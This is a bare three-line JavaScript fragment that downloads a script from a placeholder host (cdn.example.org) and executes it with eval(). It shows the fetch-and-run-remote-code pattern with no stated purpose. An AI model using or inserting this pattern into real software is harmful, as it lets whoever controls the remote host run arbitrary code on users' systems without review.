const r = await fetch('https://cdn.example.org/p.js');
const code = await r.text();
eval(code);
